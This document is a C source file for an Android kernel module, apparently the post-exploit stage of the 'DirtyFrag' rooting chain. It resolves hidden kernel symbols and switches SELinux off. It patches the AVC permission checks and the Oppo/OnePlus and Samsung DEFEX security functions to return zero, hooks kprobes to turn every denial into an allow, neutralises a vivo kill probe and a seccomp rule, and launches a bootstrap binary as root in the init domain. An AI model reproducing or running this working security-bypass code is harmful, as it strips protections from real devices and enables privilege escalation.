/*
 * DirtyFrag LKM (CVE-2026-43284) — with vivo/OriginOS hardening
 *
 * Vendor guards (all symbol-resolved, fail-open: a missing symbol only logs):
 *
 *   vr.ko  — vivo/iQOO ships a vendor module that installs a sys_exit
 *            tracepoint probe. It tags euid-0 processes (including the ksud
 *            this module spawns) and kills them on exit, so the root chain
 *            dies in a cascade. The probe itself is not unhooked
 *            (CVE-2026-43499 vr_guard.cpp): commit_creds on vivo goes
 *            through a vendor static_call so its funcs is NULL anyway, and
 *            sys_exit runs on every syscall, where rewriting tp->funcs races
 *            the callers already walking it. Instead we clear the per-task
 *            tags on zygote, so every child it forks later inherits tag == 0
 *            and the probe has nothing to kill. Only done when vr.ko is
 *            actually loaded (fail-open otherwise).
 *
 *   AVC    — some vivo builds re-arm selinux_state.enforcing right after we
 *            clear it, and CONFIG_SECURITY_SELINUX_DEVELOP=n builds have no
 *            runtime flag at all. post_handler forces every denial to allow.
 *            Because UMH_WAIT_EXEC returns before the handoff completes, the
 *            hooks stay resident on vivo-like devices (module remains loaded;
 *            dfroot_exit unregisters them on an explicit rmmod).
 *
 *   seccomp— Vivo/OriginOS (and GrapheneOS) add a policy that KILLs an app
 *            calling reboot(2). KernelSU >= 2.0 probes its driver with a
 *            magic reboot() "supercall", so libksud.so dies and the manager
 *            freezes. Downgrading the verdict to ALLOW for app uids keeps the
 *            real reboot path (CAP_SYS_BOOT still required) intact. This is
 *            opt-in because the hook must stay registered, which keeps the
 *            module resident.
 *
 * Module params:
 *   disable_vr=1            skip the zygote tag clear
 *   tag_b_off=0x2c          vr.ko tagB offset (only 6.1 was measured)
 *   enable_avc=1            opt-in: AVC allow hooks (resident kprobes)
 *   enable_seccomp_guard=1  opt-in: reboot(2) seccomp downgrade (resident)
 *
 * Defaults are deliberately conservative: only the vr.ko fix is automatic.
 * Both opt-in guards register kprobes, which forces the module to stay
 * loaded; on vivo, ksud late-load has been reported to hard-hang while
 * foreign kprobes are resident, so enable them only when the default run
 * shows AVC denials / the manager-freeze symptom.
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/rcupdate.h>
#include <linux/seccomp.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/string.h>
#include <linux/errno.h>
#include <linux/version.h>
#include <asm/cpufeature.h>
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef unsigned long (*module_kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);
typedef int  (*insn_patch_t)(void *addrs[], u32 insns[], int cnt);

/* ---------------- module parameters ---------------- */
static int disable_vr;
module_param(disable_vr, int, 0644);
MODULE_PARM_DESC(disable_vr, "skip vr.ko sys_exit neutralisation");

static int enable_avc;
module_param(enable_avc, int, 0644);
MODULE_PARM_DESC(enable_avc, "opt-in: force AVC allow via resident kprobes");

static int enable_seccomp_guard;
module_param(enable_seccomp_guard, int, 0644);
MODULE_PARM_DESC(enable_seccomp_guard,
                 "downgrade vivo reboot(2) seccomp kill (keeps module loaded)");

static insn_patch_t insn_patch_text;

static __nocfi void patch_fn_ret_zero(void *fn)
{
    void *addrs[3];
    u32 insns[3];

    addrs[0] = fn;
    addrs[1] = (u8 *)fn + 4;
    addrs[2] = (u8 *)fn + 8;

    insns[0] = 0xD503245F;  // BTI C  (valid landing pad, NOP when BTI not enforced)
    insns[1] = 0xD2800000;  // MOV x0, #0
    insns[2] = 0xD65F03C0;  // RET

    if (insn_patch_text(addrs, insns, 3))
        pr_warn("dfroot: patch failed at %px\n", fn);
}

/* ================================================================== */
/* vivo guard: vr.ko kills uid-0 processes on sys_exit                */
/* ================================================================== */
/*
 * Why the probe itself is not unhooked (CVE-2026-43499 vr_guard.cpp):
 *   - commit_creds on vivo uses a vendor hook (static_call), so that
 *     tracepoint's funcs is NULL and cannot be cleared either way;
 *   - sys_exit fires on every syscall, so rewriting tp->funcs races the
 *     callers already walking it and can panic the kernel.
 * Instead clear the per-task tags the sys_exit probe looks at: a task whose
 * tag is 0 is not killed, and every child zygote forks inherits the cleared
 * tag, which keeps ksud, the manager and their shells alive.
 *
 * Layout (CONFIG_THREAD_INFO_IN_TASK: thread_info is the first member of
 * task_struct): tagA rides the high half of thread_info.flags, tagB sits at
 * +0x2c. Both were verified on vivo 6.1.145 (iQOO 12 / X100 Ultra).
 */
static bool vivo_vr_loaded(kern_path_t kern_path_fn, path_put_t path_put_fn)
{
    static const char *const candidates[] = {
        "/sys/module/vr",       /* reported on iQOO 12 / 15 */
        "/sys/module/vr_ko",    /* alternate build name */
    };
    struct path p;

    if (!kern_path_fn)
        return false;
    for (size_t i = 0; i < ARRAY_SIZE(candidates); i++) {
        if (kern_path_fn(candidates[i], 0, &p))
            continue;
        if (path_put_fn)
            path_put_fn(&p);
        return true;
    }
    return false;
}

#define VIVO_TAG_A_OFF 0x00u   /* tagA rides the high half of thread_info.flags */

/* Verified tagB offset on vivo 6.1; overridable for other OriginOS trees. */
static unsigned int tag_b_off = 0x2cu;
module_param(tag_b_off, uint, 0644);
MODULE_PARM_DESC(tag_b_off, "offset of vr.ko tagB inside task_struct");

/* A tag is a small integer; anything with the high half set is a pointer that
 * belongs to some other field, so the offset is wrong for this kernel and the
 * word must not be written. */
static bool vivo_looks_like_tag(u64 v)
{
    return v != 0 && (v >> 32) == 0;
}

/* tagA is not a field of its own: vivo stores it in the high half of
 * thread_info.flags, so the word at +0x00 has to be zeroed whole (which also
 * drops TIF_SYSCALL_TRACEPOINT, the same trade CVE-2026-43499 makes). tagB
 * is zeroed as an aligned word at +0x2c, exactly as vr_guard.cpp does. */
static bool vivo_clear_task_tags(struct task_struct *t)
{
    u64 flags_word, tagb_word = 0;
    unsigned int b_off = tag_b_off & ~7u;
    bool has_b = b_off > 0 && b_off < 4096;

    flags_word = READ_ONCE(*(u64 *)((u8 *)t + VIVO_TAG_A_OFF));
    if (has_b)
        tagb_word = READ_ONCE(*(u64 *)((u8 *)t + b_off));
    if (!flags_word && !vivo_looks_like_tag(tagb_word))
        return false;
    if (has_b && !vivo_looks_like_tag(tagb_word))
        b_off = 0;

    WRITE_ONCE(*(u64 *)((u8 *)t + VIVO_TAG_A_OFF), 0);
    if (b_off)
        WRITE_ONCE(*(u64 *)((u8 *)t + b_off), 0);

    pr_info("dfroot: cleared %s tags on %s (pid %d, flags=%016llx%s)\n",
            b_off ? "both" : "tagA", t->comm, t->pid, flags_word,
            b_off ? "" : " tagB offset mismatch");
    return true;
}

/* zygote's main thread renames its comm to "main", so the leader alone is not
 * enough; CVE-2026-43499 finds it by walking init's children, here we use the
 * same discriminator (parent is init). */
static bool vivo_is_zygote(struct task_struct *p)
{
    if (!strcmp(p->comm, "zygote64") || !strcmp(p->comm, "zygote"))
        return true;
    return !strcmp(p->comm, "main") && p->real_parent &&
           p->real_parent->pid == 1;
}

static void vivo_neutralize_vr(kern_path_t kern_path_fn, path_put_t path_put_fn)
{
    struct task_struct *p, *t;
    int procs = 0, cleared = 0;

    if (disable_vr) {
        pr_info("dfroot: disable_vr set; vr.ko left alone\n");
        return;
    }
    if (!vivo_vr_loaded(kern_path_fn, path_put_fn)) {
        pr_info("dfroot: no vr module loaded; tag clear skipped\n");
        return;
    }

    /* 5.10 is outside the reported vivo/iQOO range and its tag layout is
     * unknown, so never touch task_struct there. */
    if (LINUX_VERSION_CODE < KERNEL_VERSION(6, 1, 0)) {
        pr_info("dfroot: kernel < 6.1; vr guard skipped\n");
        return;
    }

    /* Only the 6.1 layout was measured. Later trees still get tagA (flags is
     * the first word of thread_info on every 6.x), but tagB is written only
     * when the word at tag_b_off reads like a tag. */
    if (LINUX_VERSION_CODE >= KERNEL_VERSION(6, 2, 0))
        pr_warn("dfroot: tag layout unverified here; tagB written only if it "
                "reads as a tag (tag_b_off=0x%x)\n", tag_b_off);

    rcu_read_lock();
    for_each_process(p) {
        if (!vivo_is_zygote(p))
            continue;
        procs++;
        for_each_thread(p, t) {
            if (vivo_clear_task_tags(t))
                cleared++;
        }
    }
    rcu_read_unlock();

    pr_info("dfroot: zygote tag clear done: processes=%d tasks=%d\n",
            procs, cleared);
}

/* vivo/iQOO detection: cmdline carries "vivo", or a vr.ko module is loaded.
 * Used to gate the AVC/seccomp guards so Samsung/Pixel flows are untouched. */
static bool vivo_like(kallsyms_lookup_name_t get_addr,
                      kern_path_t kern_path_fn, path_put_t path_put_fn)
{
    const char *cmdline = (const char *)get_addr("saved_command_line");

    if (cmdline && strstr(cmdline, "vivo"))
        return true;
    return vivo_vr_loaded(kern_path_fn, path_put_fn);
}

/* ================================================================== */
/* vivo guard: AVC allow while the handoff runs (temporary)           */
/* ================================================================== */
static struct kprobe avc_kp;
static struct kprobe avc_noaudit_kp;
static bool avc_kp_ok;
static bool avc_noaudit_kp_ok;

static void avc_allow_post_handler(struct kprobe *p, struct pt_regs *regs,
                                   unsigned long flags)
{
    (void)p;
    (void)flags;
    regs->regs[0] = 0;      /* every denial becomes an allow */
}

static void vivo_install_avc(void)
{
    if (!enable_avc) {
        pr_info("dfroot: AVC guard not requested (enable_avc=0)\n");
        return;
    }

    memset(&avc_noaudit_kp, 0, sizeof(avc_noaudit_kp));
    avc_noaudit_kp.symbol_name = "avc_has_perm_noaudit";
    avc_noaudit_kp.post_handler = avc_allow_post_handler;
    avc_noaudit_kp_ok = (register_kprobe(&avc_noaudit_kp) == 0);
    if (avc_noaudit_kp_ok)
        pr_info("dfroot: avc_has_perm_noaudit hooked\n");
    else
        pr_warn("dfroot: avc_has_perm_noaudit not hookable; skipping\n");

    memset(&avc_kp, 0, sizeof(avc_kp));
    avc_kp.symbol_name = "avc_has_perm";
    avc_kp.post_handler = avc_allow_post_handler;
    avc_kp_ok = (register_kprobe(&avc_kp) == 0);
    if (avc_kp_ok)
        pr_info("dfroot: avc_has_perm hooked\n");
    else
        pr_warn("dfroot: avc_has_perm not hookable; skipping\n");
}

static void vivo_remove_avc(void)
{
    if (avc_noaudit_kp_ok) {
        unregister_kprobe(&avc_noaudit_kp);
        avc_noaudit_kp_ok = false;
    }
    if (avc_kp_ok) {
        unregister_kprobe(&avc_kp);
        avc_kp_ok = false;
    }
}

/* ================================================================== */
/* vivo guard: reboot(2) seccomp kill (opt-in, persistent)            */
/* ================================================================== */
#define DF_NR_REBOOT 142        /* __NR_reboot, arm64 */

static struct kprobe seccomp_kp;
static bool seccomp_kp_ok;

static int seccomp_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    const struct seccomp_data *sd =
        (const struct seccomp_data *)regs->regs[0];

    (void)p;
    if (!sd || sd->nr != DF_NR_REBOOT)
        return 0;
    if (__kuid_val(current_uid()) < 10000)
        return 0;

    regs->regs[0] = SECCOMP_RET_ALLOW;
    regs->regs[1] = 0;                  /* match pointer stays NULL */
    instruction_pointer_set(regs, regs->regs[30]);
    return 1;
}

static void vivo_install_seccomp(void)
{
    if (!enable_seccomp_guard) {
        pr_info("dfroot: seccomp guard disabled (enable_seccomp_guard=0)\n");
        return;
    }

    memset(&seccomp_kp, 0, sizeof(seccomp_kp));
    seccomp_kp.symbol_name = "seccomp_run_filters";
    seccomp_kp.pre_handler = seccomp_pre_handler;
    seccomp_kp_ok = (register_kprobe(&seccomp_kp) == 0);
    if (seccomp_kp_ok)
        pr_info("dfroot: reboot(2) seccomp kill downgraded\n");
    else
        pr_warn("dfroot: seccomp_run_filters not hookable; skipping\n");
}

/* ================================================================== */

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    module_kallsyms_lookup_name_t mkln;
    struct kprobe kln_kp;
    void *avc_fn, *avc_noaudit_fn, *oplus_exe_fn, *oplus_root_fn, *defex_enforce_fn, *defex_umh_fn;
    void *info;
    int ret;

    // UMH command to run. Upstream 4.2-4.5 replaced the old
    // "touch /dev/dfm0; rmmod oplus_* 2>/dev/null; exit 0" chain. Those rmmods
    // tripped the Oppo/OnePlus security anti-tamper reset (our issue #21), and
    // because `sh -c` returns the exit code of the LAST command, a failing
    // rmmod also made the helper report "returned 256" everywhere else, which
    // is what killed the run at the verify stage (our issue #5). The vendor
    // hardening checks are now patched in-kernel with aarch64_insn_patch_text,
    // the helper only touches the marker and execs bootstrap, and the call is
    // UMH_WAIT_EXEC, so there is no child exit status left to leak.
    static const char sh[] = "/system/bin/sh";
    static char cmd[768];
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
    /* The SDK stages its bootstrap under its own device-protected dir. The
     * module runs as root, so discover the file instead of hardcoding a
     * package name (the APK build and the SDK use the same file name).
     * Upstream v4.6's exec-domain pin (u:r:init:s0) is kept: even when the
     * attr write fails the trailing exec still runs. */
    snprintf(cmd, sizeof(cmd),
             "B=$(ls /data/user_de/0/*/dfroot_bootstrap 2>/dev/null | head -1); "
             "[ -n \"$B\" ] || B=$(ls /data/user/0/*/dfroot_bootstrap 2>/dev/null | head -1); "
             "[ -n \"$B\" ] || { touch /dev/dfme0; exit 1; }; "
             "touch /dev/dfm0; echo -n 'u:r:init:s0' > /proc/self/attr/exec; exec \"$B\"");

    // Symbol finder
    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
    if (register_kprobe(&kln_kp) < 0) {
        pr_err("dfroot: kallsyms_lookup_name not found\n");
        return -EINVAL;
    }
    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
    unregister_kprobe(&kln_kp);

    insn_patch_text = (insn_patch_t)get_addr("aarch64_insn_patch_text");
    if (!insn_patch_text) {
        pr_err("dfroot: aarch64_insn_patch_text not found\n");
        return -EINVAL;
    }

    mkln = (module_kallsyms_lookup_name_t)get_addr("module_kallsyms_lookup_name");

    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    path_put_fn   = (path_put_t)  get_addr("path_put");

    /* vivo: clear zygote tags before anything spawns ksud/bootstrap, so the
     * vr.ko sys_exit probe has nothing to kill in the new children */
    vivo_neutralize_vr(kern_path_fn, path_put_fn);

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    // Some kernels ship CONFIG_SECURITY_SELINUX_DEVELOP=n, so the selinux_state
    // write above is a no-op there — patch the SELinux checks themselves instead
    // (both: most denials surface through the noaudit path first).
    if (READ_ONCE(*selinux_state)) {
        avc_fn = (void *)get_addr("avc_has_perm");
        if (!avc_fn)
            pr_err("dfroot: avc_has_perm not found, skipping\n");
        else {
            patch_fn_ret_zero(avc_fn);
            pr_info("dfroot: avc_has_perm patched\n");
        }

        avc_noaudit_fn = (void *)get_addr("avc_has_perm_noaudit");
        if (!avc_noaudit_fn)
            pr_err("dfroot: avc_has_perm_noaudit not found, skipping\n");
        else {
            patch_fn_ret_zero(avc_noaudit_fn);
            pr_info("dfroot: avc_has_perm_noaudit patched\n");
        }
    }

    /* vivo re-arms enforcing and some builds have no runtime flag at all:
     * force allow at the AVC layer for the duration of the handoff. Gated on
     * vivo-like devices so Samsung/Pixel keep their original flow. */
    if (vivo_like(get_addr, kern_path_fn, path_put_fn))
        vivo_install_avc();
    else
        pr_info("dfroot: not vivo-like; AVC guard skipped\n");

    // Oppo/OnePlus
    oplus_exe_fn = (void *)(mkln ? mkln("oplus_exe_block_ret_handler") : 0);
    if (!oplus_exe_fn)
        pr_err("dfroot: oplus_exe_block_ret_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_exe_fn);
        pr_info("dfroot: oplus_exe_block_ret_handler patched\n");
    }

    oplus_root_fn = (void *)(mkln ? mkln("oplus_root_check_post_handler") : 0);
    if (!oplus_root_fn)
        pr_err("dfroot: oplus_root_check_post_handler not found, skipping\n");
    else {
        patch_fn_ret_zero(oplus_root_fn);
        pr_info("dfroot: oplus_root_check_post_handler patched\n");
    }

    // Samsung
    defex_enforce_fn = (void *)get_addr("task_defex_enforce");
    if (!defex_enforce_fn)
        pr_err("dfroot: task_defex_enforce not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_enforce_fn);
        pr_info("dfroot: task_defex_enforce patched\n");
    }

    defex_umh_fn = (void *)get_addr("task_defex_user_exec");
    if (!defex_umh_fn)
        pr_err("dfroot: task_defex_user_exec not found, skipping\n");
    else {
        patch_fn_ret_zero(defex_umh_fn);
        pr_info("dfroot: task_defex_user_exec patched\n");
    }

    /* vivo: optional persistent seccomp hook, must be live before ksud runs */
    vivo_install_seccomp();

    // Run UMH command
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        vivo_remove_avc();
        return -EINVAL;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        vivo_remove_avc();
        return -EINVAL;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_EXEC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);

    /* UMH_WAIT_EXEC only waits for sh to exec, not for bootstrap/ksud to
     * finish, so the guard hooks must stay resident on vivo-like devices
     * (vivo re-arms enforcing while ksud late-loads and the manager talks to
     * the driver). Keeping a kprobe registered requires the module to stay
     * loaded; dfroot_exit() unregisters them on an explicit rmmod. */
    if (avc_kp_ok || avc_noaudit_kp_ok || seccomp_kp_ok) {
        pr_info("dfroot: guard hooks resident; module stays loaded\n");
        return 0;
    }
    /* intentionally fail init to unload immediately; avoids triggering
     * mrdump module-loaded callbacks on MTK devices */
    return -ENODEV;
}

/* Having a module_exit is not optional: some kernels' cfi_init walks both
 * __cfi_jt_init_module and __cfi_jt_cleanup_module at load time; without a
 * module_exit, the cleanup_module CFI jump table entry is absent and
 * cfi_init crashes in strcmp (upstream v4.6 "Fix oppo devices"). */
static void __exit dfroot_exit(void)
{
    if (seccomp_kp_ok) {
        unregister_kprobe(&seccomp_kp);
        seccomp_kp_ok = false;
    }
    vivo_remove_avc();
    pr_info("dfroot: unloaded\n");
}

module_init(dfroot_init);
module_exit(dfroot_exit);
